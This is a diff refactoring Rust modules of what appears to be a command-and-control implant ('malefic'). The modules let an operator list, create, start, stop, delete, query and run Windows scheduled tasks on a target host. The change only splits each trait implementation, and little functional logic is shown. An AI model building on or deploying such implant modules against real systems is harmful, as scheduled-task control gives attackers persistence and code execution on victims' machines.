@@ -1,5 +1,5 @@
 use std::time::Duration;
-use crate::{Module, TaskResult, Result, Input, Output, check_request, check_field};
+use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
 use malefic_proto::proto::implantpb::{spite::Body};
 use async_trait::async_trait;
 use malefic_trait::module_impl;
@@ -24,8 +24,11 @@ pub struct TaskSchdList {}
 
 #[async_trait]
 #[module_impl("taskschd_list")]
-impl Module for TaskSchdList {
-    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
+impl Module for TaskSchdList {}
+
+#[async_trait]
+impl ModuleImpl for TaskSchdList {
+        async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
         let _ = check_request!(_receiver, Body::Request)?;
         let manager = TaskSchedulerManager::initialize()?;
 
@@ -40,11 +43,14 @@ impl Module for TaskSchdList {
     }
 }
 
+
 pub struct TaskSchdCreate {}
 
 #[async_trait]
 #[module_impl("taskschd_create")]
-impl Module for TaskSchdCreate {
+impl Module for TaskSchdCreate {}
+#[async_trait]
+impl ModuleImpl for TaskSchdCreate {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
 
@@ -72,7 +78,9 @@ pub struct TaskSchdStart {}
 
 #[async_trait]
 #[module_impl("taskschd_start")]
-impl Module for TaskSchdStart {
+impl Module for TaskSchdStart {}
+#[async_trait]
+impl ModuleImpl for TaskSchdStart {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
         let manager = TaskSchedulerManager::initialize()?;
@@ -88,7 +96,9 @@ pub struct TaskSchdStop {}
 
 #[async_trait]
 #[module_impl("taskschd_stop")]
-impl Module for TaskSchdStop {
+impl Module for TaskSchdStop {}
+#[async_trait]
+impl ModuleImpl for TaskSchdStop {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
 
@@ -105,7 +115,9 @@ pub struct TaskSchdDelete {}
 
 #[async_trait]
 #[module_impl("taskschd_delete")]
-impl Module for TaskSchdDelete {
+impl Module for TaskSchdDelete {}
+#[async_trait]
+impl ModuleImpl for TaskSchdDelete {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
 
@@ -122,7 +134,9 @@ pub struct TaskSchdQuery {}
 
 #[async_trait]
 #[module_impl("taskschd_query")]
-impl Module for TaskSchdQuery {
+impl Module for TaskSchdQuery {}
+#[async_trait]
+impl ModuleImpl for TaskSchdQuery {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
 
@@ -142,7 +156,9 @@ pub struct TaskSchdRun {}
 
 #[async_trait]
 #[module_impl("taskschd_run")]
-impl Module for TaskSchdRun {
+impl Module for TaskSchdRun {}
+#[async_trait]
+impl ModuleImpl for TaskSchdRun {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ScheduleRequest)?;
 
